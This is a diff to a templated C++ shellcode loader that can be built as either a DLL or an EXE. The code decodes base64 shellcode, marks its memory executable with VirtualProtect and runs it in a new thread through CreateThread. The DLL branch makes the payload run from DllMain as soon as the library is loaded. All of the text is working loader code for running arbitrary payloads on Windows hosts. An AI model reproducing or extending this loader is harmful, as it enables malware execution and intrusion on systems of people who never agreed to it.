@@ -5,10 +5,17 @@
 #include "shellcode.h"
 #include "util.h"
 
+{{ if eq .Format "dll" }}
+
+BOOL WINAPI DllMain(HINSTANCE hInst, DWORD fdwReason, LPVOID lpvReserved) {
+ if (fdwReason != DLL_PROCESS_ATTACH)
+	return true;
+
+{{ else if eq .Format "exe" }}
+	
 int main(int argc, char** argv) {
 
-	// 	if (fdwReason != DLL_PROCESS_ATTACH)
-	// 		return true;
+{{ end }}
 
 	std::vector<char> buffer = base64_decode(shellcode, shellcodeLen);
 	int bufferSize = buffer.size();
@@ -20,7 +27,9 @@ int main(int argc, char** argv) {
 	::VirtualProtect(addressPointer, bufferSize, PAGE_EXECUTE_READ, &dummy);
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
 
+	{{ if eq .Format "exe" }}
 	WaitForSingleObject(hThread, INFINITE);
+	{{ end }}
 
 	return true;
 }
